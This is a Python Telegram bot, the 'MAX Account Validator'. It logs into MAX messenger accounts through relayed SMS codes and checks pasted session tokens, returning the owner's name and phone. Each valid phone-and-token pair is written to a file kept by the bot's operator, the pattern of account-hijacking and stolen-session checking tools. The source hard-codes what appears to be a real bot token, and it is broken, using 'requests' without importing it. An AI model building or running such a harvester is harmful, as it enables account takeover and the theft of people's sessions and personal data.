import asyncio
import telebot
from telebot import types
import logging
import json
import websockets

BOT_TOKEN = "8407984730:AAGVNP8TWRP7AcsrWk5xod0z8qbsW7qt3lE"

bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

user_states = {}

MAX_WS_URL = "wss://max.ru/ws"
MAX_REQUEST_CODE_URL = "https://max.ru/api/auth/request_code"
MAX_CONFIRM_CODE_URL = "https://max.ru/api/auth/confirm_code"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://max.ru",
    "Referer": "https://max.ru/auth/login"
}


async def check_token_ws(access_token):
    """
    Проверяет токен через WebSocket (десктопный протокол MAX).
    """
    try:
        async with websockets.connect(MAX_WS_URL, extra_headers={"User-Agent": HEADERS["User-Agent"]}, timeout=20) as ws:
            # Отправляем авторизационный пакет
            auth_packet = json.dumps({
                "op": "auth",
                "token": access_token
            })
            await ws.send(auth_packet)
            
            # Ждём ответ
            response = await asyncio.wait_for(ws.recv(), timeout=10)
            data = json.loads(response)
            
            if data.get("status") == "ok" or data.get("type") == "auth_ok":
                user = data.get("user", {})
                info = f"ID: {user.get('id', 'N/A')}\nИмя: {user.get('first_name', 'N/A')} {user.get('last_name', '')}\nТелефон: {user.get('phone', 'N/A')}"
                return True, info
            else:
                return False, data.get("error", "Токен не принят")
    except Exception as e:
        return False, f"Ошибка соединения: {str(e)}"


def request_sms_code(phone):
    try:
        resp = requests.post(MAX_REQUEST_CODE_URL, headers=HEADERS, json={"phone": phone, "type": "login"}, timeout=15)
        data = resp.json()
        if resp.status_code == 200 and data.get("success"):
            return True, data.get("session_id", ""), "Код отправлен на номер"
        elif resp.status_code == 429:
            return False, None, "Слишком много запросов."
        elif "not found" in str(data).lower():
            return False, None, "Номер не зарегистрирован"
        elif "blocked" in str(data).lower():
            return False, None, "Аккаунт заблокирован"
        return False, None, f"Ошибка: {data}"
    except Exception as e:
        return False, None, f"Ошибка: {e}"


def confirm_code(phone, code, session_id):
    try:
        resp = requests.post(MAX_CONFIRM_CODE_URL, headers=HEADERS, json={"phone": phone, "code": code, "session_id": session_id}, timeout=15)
        data = resp.json()
        if resp.status_code == 200 and data.get("access_token"):
            return True, data.get("access_token"), "Вход выполнен"
        elif "invalid" in str(data).lower():
            return False, None, "Неверный код"
        elif "expired" in str(data).lower():
            return False, None, "Код истёк"
        return False, None, f"Ошибка: {data}"
    except Exception as e:
        return False, None, f"Ошибка: {e}"


def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("📱 Войти по номеру", "🔑 Войти по токену")
    return markup


def cancel_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("❌ Отмена")
    return markup


@bot.message_handler(commands=['start'])
def start(message):
    user_states.pop(message.chat.id, None)
    bot.reply_to(message, "🔐 **MAX Account Validator**\n\nВыберите способ входа:", parse_mode="Markdown", reply_markup=main_keyboard())


@bot.message_handler(func=lambda m: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip()
    state = user_states.get(chat_id, {}).get("state")

    if text == "❌ Отмена":
        user_states.pop(chat_id, None)
        bot.reply_to(message, "Отменено.", reply_markup=main_keyboard())
        return

    if text == "📱 Войти по номеру":
        user_states[chat_id] = {"state": "waiting_phone", "mode": "phone"}
        bot.reply_to(message, "📱 Введите номер:\n`+7XXXXXXXXXX`", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return

    if text == "🔑 Войти по токену":
        user_states[chat_id] = {"state": "waiting_token", "mode": "token"}
        bot.reply_to(message, "🔑 Вставьте токен:", reply_markup=cancel_keyboard())
        return

    if state == "waiting_phone":
        phone = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not phone.startswith("+"):
            phone = "+7" + phone.lstrip("87")
        bot.reply_to(message, "📱 Запрашиваю SMS-код...")
        success, session_id, msg = request_sms_code(phone)
        if success:
            user_states[chat_id] = {"state": "waiting_code", "phone": phone, "session_id": session_id}
            bot.reply_to(message, f"✅ {msg}\n\n📩 Введите 6-значный код:", reply_markup=cancel_keyboard())
        else:
            bot.reply_to(message, f"❌ {msg}")

    elif state == "waiting_code":
        code = text.strip()
        if not code.isdigit() or len(code) != 6:
            bot.reply_to(message, "Код должен быть из 6 цифр.")
            return
        phone = user_states[chat_id]["phone"]
        session_id = user_states[chat_id]["session_id"]
        bot.reply_to(message, "🔐 Вхожу...")
        success, access_token, msg = confirm_code(phone, code, session_id)
        if success:
            bot.reply_to(message, f"🟢 **ВХОД ВЫПОЛНЕН!**\n\nТокен: `{access_token[:40]}...`", parse_mode="Markdown", reply_markup=main_keyboard())
            with open("valid_accounts.txt", "a") as f:
                f.write(f"[PHONE] {phone} | {access_token}\n")
        else:
            bot.reply_to(message, f"❌ {msg}", reply_markup=main_keyboard())
        user_states.pop(chat_id, None)

    elif state == "waiting_token":
        access_token = text.replace(" ", "").replace("\n", "")
        if len(access_token) < 50:
            bot.reply_to(message, "❌ Токен слишком короткий.", reply_markup=cancel_keyboard())
            return
        bot.reply_to(message, "🔍 Проверяю токен через WebSocket...")
        # Запускаем асинхронную проверку
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        valid, info = loop.run_until_complete(check_token_ws(access_token))
        loop.close()
        if valid:
            bot.reply_to(message, f"🟢 **СЕССИЯ АКТИВНА!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
            with open("valid_accounts.txt", "a") as f:
                f.write(f"[TOKEN] {access_token[:40]}... | {info}\n")
        else:
            bot.reply_to(message, f"🔴 {info}", reply_markup=main_keyboard())
        user_states.pop(chat_id, None)


if __name__ == "__main__":
    print("🤖 MAX Validator запущен...")
    bot.infinity_polling()